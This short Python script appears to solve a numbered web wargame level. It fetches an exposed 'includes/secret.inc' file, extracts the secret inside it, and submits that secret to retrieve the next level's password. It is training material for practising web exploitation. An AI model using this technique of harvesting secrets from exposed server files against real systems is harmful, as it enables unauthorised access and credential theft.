import Auther
import re
if secret := re.compile(r'"(\w+)"').search(Auther.request(6, "includes/secret.inc").text):
    Auther.passwordIsGetter((Auther.request(6, data={
        "submit": "",
        "secret": secret[1]
    }).text), 7)()
